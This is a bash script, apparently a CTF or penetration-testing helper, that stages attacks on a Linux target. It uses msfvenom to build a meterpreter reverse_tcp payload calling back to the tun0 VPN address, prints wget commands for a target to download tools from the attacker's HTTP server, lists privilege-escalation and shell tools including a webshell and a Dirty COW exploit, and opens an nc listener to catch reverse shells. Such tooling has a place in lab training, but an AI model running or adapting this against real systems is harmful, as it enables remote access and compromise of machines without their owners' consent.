#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                            LINUX HTTP SERVER MANAGER
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
filename="file.txt"

while read line
  do
  msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=$line LPORT=6666 -f exe -o ./ALL/linpayload.elf
done < $filename

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display my universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

clear

echo "\t\t _     ___ _   _ _   ___  __  _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
echo "\t\t| |   |_ _| \ | | | | \ \/ / | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
echo "\t\t| |    | ||  \| | | | |\  /  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | "
echo "\t\t| |___ | || |\  | |_| |/  \  |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  "
echo "\t\t|_____|___|_| \_|\___//_/\_\ |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ "
echo "\t\t                                                                                              "
echo "\t\t                   BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                      "
echo "\n"

echo "Startup Instructions:\n"
while read line
  do
  echo "wget \"http://$line:80/ALL/"
done < $filename

echo "\nENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			KERNAL EXPLOITS		"
echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
echo "coffee.sh\"			linpayload.elf\"		\tpspy32\"			\tchisel\"			\tnaughtycowcompile.sh\""
echo "linpeas.sh\"			webshell.php\"			pspy64\"			\tnc\"				naughycow.c\"		"
echo "linenum.sh\"																		"
echo "linenumplus.sh\"																		"
echo "linpe.sh\"\n																		"
echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"

exec python3 -m http.server 80 > output.txt &
exec rlwrap nc -lvnp 9001

#End
